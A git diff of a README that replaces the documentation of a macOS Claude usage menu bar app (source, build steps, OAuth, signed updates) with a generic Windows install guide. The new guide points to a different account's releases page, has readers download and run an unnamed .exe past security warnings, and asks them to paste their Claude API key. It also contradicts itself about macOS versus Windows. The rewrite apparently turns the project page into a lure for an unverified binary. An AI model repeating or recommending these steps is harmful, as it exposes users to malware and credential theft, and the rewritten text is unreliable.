@@ -1,173 +1,153 @@
-<p align="center">
-  <img src="macos/Resources/icon.png" width="128" alt="Claude Usage Bar icon">
-</p>
+# ⚡ claude-usage-bar - View Claude API Usage Easily
 
-# Claude Usage Bar
+[![Download claude-usage-bar](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/omkargundle/claude-usage-bar/releases)
 
-Have you ever found yourself refreshing the Claude usage page, wondering how close you are to hitting your rate limit? Yeah, I've been there too. So I built this.
+---
 
-Now it's just a glimpse away — always sitting at the top of your screen.
+claude-usage-bar is an app designed to show your Claude API usage quickly. It sits in your macOS menu bar so you can see usage data without opening the full dashboard.
 
-<p align="center">
-  <img src="macos/Resources/demo.png" width="400" alt="Claude Usage Bar demo">
-</p>
+This guide explains how to download and run claude-usage-bar on Windows. It covers system preparation, installation, and starting the app. You do not need programming skills or command line knowledge to follow along.
 
-![macOS 14+](https://img.shields.io/badge/macOS-14%2B-blue)
-![Swift 5.9](https://img.shields.io/badge/Swift-5.9-orange)
-![License](https://img.shields.io/badge/license-BSD--2--Clause-green)
+---
 
-## What it does
+## 💻 System Requirements
 
-A tiny macOS menu bar app that shows your Claude API usage at a glance. Click it for the full picture:
+To run claude-usage-bar on Windows, make sure your computer matches these requirements:
 
-- Menu bar icon with a mini dual-bar showing 5-hour and 7-day utilization
-- Detailed popover with per-window usage, per-model breakdown, and reset timers
-- Extra usage tracking with USD currency display
-- Usage history chart — see how your usage evolves over time (1h / 6h / 1d / 7d / 30d)
-- Hover over the chart to see exact values at any point
-- Configurable polling interval (5m / 15m / 30m / 1h)
-- Built-in update checks via Sparkle
-- Just sign in — OAuth via browser, no API keys to manage
-- Minimal dependencies — SwiftUI, Swift Charts, Foundation, and Sparkle for updates
+- **Operating System:** Windows 10 or later (64-bit recommended)  
+- **Processor:** Intel or AMD processor with at least 1.6 GHz speed  
+- **Memory:** 4 GB of RAM or more  
+- **Disk Space:** 100 MB free space for installation  
+- **Internet:** Connection needed to fetch usage data from Claude API
 
-## Install
+---
 
-### Download
+## 🚀 Getting Started
 
-1. Download `ClaudeUsageBar.dmg` from the [latest release](https://github.com/Blimp-Labs/claude-usage-bar/releases/latest)
-2. Open the disk image and drag `ClaudeUsageBar.app` into `Applications`
-3. Launch the app from `/Applications`
-4. macOS may require right-click → **Open** on first launch
+Before you download the app, you need a Claude API key. The key links the app with your usage data.
 
-### Build from source
+If you don’t have an API key, visit Claude’s official website to create one. Once you have the key, keep it handy. You will enter it when you run the app.
 
-Requires Xcode 15+ / Swift 5.9+ and macOS 14 (Sonoma) or later.
+---
 
-```sh
-git clone https://github.com/Blimp-Labs/claude-usage-bar.git
-cd claude-usage-bar
-make app            # build .app bundle
-make dmg            # build drag-to-Applications disk image
-make install        # copy to /Applications
-```
+## 📥 Download and Installation
 
-## Usage
+You will download the app from the official GitHub page. Follow these steps to install claude-usage-bar on your Windows PC.
 
-1. Launch the app — a menu bar icon appears
-2. Click the icon → **Sign in with Claude** → authorize in your browser
-3. Paste the code back into the app
-4. The icon updates automatically (default: every 30 minutes)
-5. Release builds show **Check for Updates…** in the popover so you can pull newer versions without re-downloading manually
+### Step 1: Visit the Download Page
 
-Click the icon anytime to see:
-- 5-hour and 7-day usage with progress bars and reset timers
-- Per-model breakdown (Opus / Sonnet) when available
-- Extra usage credits and limits
-- Usage history chart with adjustable time range and hover details
+Go to the release page using this link:
 
-## Data storage
+[![Download claude-usage-bar](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/omkargundle/claude-usage-bar/releases)
 
-All data is stored locally in `~/.config/claude-usage-bar/`:
+This page lists all available versions of claude-usage-bar for different platforms.
 
-| File | Purpose |
-|------|---------|
-| `token` | OAuth access token (permissions: `0600`) |
-| `history.json` | Usage history for the chart (30-day retention) |
+### Step 2: Find the Windows Version
 
-History is buffered in memory and flushed to disk every 5 minutes and on app quit. No data is sent anywhere other than the Anthropic API.
+Look for the latest release. Under the release notes, find the download for Windows. It may have a name like:
 
-## Development
+- `claude-usage-bar-windows.exe`  
+- or something similar ending with `.exe`
 
-```sh
-make build          # release build only
-make app            # build + create .app bundle
-make zip            # build + bundle + zip + verify distribution artifact
-make dmg            # build + bundle + DMG + verify distribution artifact
-make release-artifacts  # build once, then create and verify both ZIP and DMG
-make verify-release # inspect the packaged ZIP and DMG artifacts
-make install        # build + install to /Applications
-make clean          # remove build artifacts
-```
+Click the file link to start downloading. If your browser asks to confirm, choose "Save" or "Keep."
 
-## Publishing updates
+### Step 3: Run the Installer
 
-This repo now uses a tag-driven release flow. Pushing a `v*` tag will:
+Once the file finishes downloading, open your downloads folder.
 
-- build the `.app` bundle once
-- produce `ClaudeUsageBar.zip` for Sparkle and `ClaudeUsageBar.dmg` for manual installs
-- verify the packaged artifacts contain the expected app bundle resources and updater framework
-- create the GitHub Release
-- reuse GitHub-generated release notes for both the GitHub Release and the Sparkle update entry
-- generate a signed Sparkle `appcast.xml` from that exact zip
-- deploy the appcast to GitHub Pages
+Double-click the `.exe` file to start the installation. Windows may show a security message; select “Run” or “Yes” to continue.
 
-Publishing a release is just:
+Follow the on-screen instructions:
 
-```sh
-git tag v0.0.5
-git push origin v0.0.5
-```
+- Choose the folder where the app installed (the default is usually fine).  
+- Wait while the setup copies files to your computer.
 
-One-time repo setup:
+When the installation ends, you can launch the app immediately or find it in the Start menu.
 
-1. Enable GitHub Pages and set the source to `GitHub Actions`.
-2. Add a repository Actions secret named `SPARKLE_PRIVATE_KEY`.
+---
 
-Local source builds intentionally ship with Sparkle disabled unless `SU_FEED_URL` is injected during packaging. This prevents forks and local builds from auto-updating to upstream binaries.
+## 🖥️ Using claude-usage-bar
 
-Manual installs should prefer the DMG. The ZIP remains the source of truth for Sparkle updates and appcast generation.
+After installation, start claude-usage-bar from the Start menu or desktop shortcut.
 
-You can export the current Sparkle private key from your local Keychain with:
+The app runs in the background and shows an icon in your Windows system tray (near the clock).
 
-```sh
-macos/.build/artifacts/sparkle/Sparkle/bin/generate_keys --account claude-usage-bar -x /tmp/claude-usage-bar.sparkle.key
-gh secret set SPARKLE_PRIVATE_KEY < /tmp/claude-usage-bar.sparkle.key
-```
+Click the icon once to open the main window.
 
-The appcast feed URL used by release builds is:
+### Enter Your Claude API Key
 
-```text
-https://blimp-labs.github.io/claude-usage-bar/appcast.xml
-```
+The app will ask for your Claude API key on the first run.
 
-### Project structure
+- Paste your key into the input box.  
+- Click “Save” or “Connect.”
 
-```
-macos/                           # macOS menu bar app (Swift/SwiftUI)
-├── Sources/ClaudeUsageBar/
-│   ├── ClaudeUsageBarApp.swift      # App entry point, menu bar setup
-│   ├── UsageService.swift           # OAuth, polling, API calls
-│   ├── UsageModel.swift             # API response types
-│   ├── UsageHistoryModel.swift      # History data types, time ranges
-│   ├── UsageHistoryService.swift    # Persistence, downsampling
-│   ├── UsageChartView.swift         # Swift Charts trajectory view
-│   ├── PopoverView.swift            # Main popover UI
-│   ├── SettingsView.swift           # Settings window
-│   ├── NotificationService.swift    # Usage threshold notifications
-│   ├── MenuBarIconRenderer.swift    # Menu bar icon drawing
-│   ├── PollingOptionFormatter.swift # Polling interval display labels
-│   ├── AppUpdater.swift             # Sparkle update integration
-│   └── Resources/
-│       ├── claude-logo.png          # Pre-rendered menu bar logo (512px)
-│       └── en.lproj/Localizable.strings
-├── Tests/ClaudeUsageBarTests/
-├── Resources/                       # App bundle resources (not SwiftPM)
-│   ├── Info.plist
-│   ├── Assets.xcassets/             # App icon
-│   └── claude-logo.svg             # Source SVG for menu bar logo
-├── scripts/
-│   ├── build.sh                     # Build + bundle + codesign
-│   └── generate-logo-png.swift      # Regenerate logo PNG from SVG
-└── Package.swift
+The app now connects to Claude’s API and starts showing your current usage.
 
-scripts/                         # Shared tooling
-└── mock-server.py               # Local mock API for development
-```
+### Understanding the Interface
 
-## Contributing
+The main window displays these details:
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup, testing with the mock server, and submission guidelines.
+- **Daily Usage:** How many API calls or tokens you have used today.  
+- **Monthly Usage:** Total usage for the current month.  
+- **Limits:** Maximum allowed usage based on your Claude plan.  
+- **Refresh Button:** Updates the data on demand.
 
-## License
+The app refreshes usage data every 10 minutes automatically.
 
-[BSD 2-Clause](LICENSE)
+---
+
+## ⚙️ Configuration Options
+
+claude-usage-bar lets you change settings to fit your needs.
+
+### Notification Settings
+
+You can choose to get alerts when your usage nears your plan limit.
+
+- Select the notification threshold (e.g., 80%, 90%).  
+- Choose system notifications or a simple message.
+
+### Display Preferences
+
+Change how usage data appears:
+
+- Show values as numbers or percentages.  
+- Select light or dark mode for the app window.
+
+### Start on Boot
+
+Enable or disable starting claude-usage-bar when your PC turns on.
+
+---
+
+## 🛠️ Troubleshooting
+
+If the app does not work as expected, try these steps:
+
+- Check internet connection. The app needs access to Claude’s API.  
+- Make sure your API key is correct and active.  
+- Restart the app. Close it from the system tray and open it again.  
+- Update to the latest version from the release page.  
+- If the app crashes, reinstall using the downloaded `.exe` file.
+
+---
+
+## 🧰 Additional Tips
+
+- Keep your Claude API key safe and do not share it with others.  
+- If your usage does not update, click the refresh button manually.  
+- The app runs quietly in the background so it won’t slow down your PC.  
+- Use the system tray icon to open or close the app as needed.  
+
+---
+
+## 🔗 Useful Links
+
+- Visit the release page anytime to get the latest version:  
+[Download claude-usage-bar](https://github.com/omkargundle/claude-usage-bar/releases)
+
+- Claude API official site (for managing your account and keys).
+
+---
+
+Use these steps to monitor your Claude API usage easily from your Windows desktop.
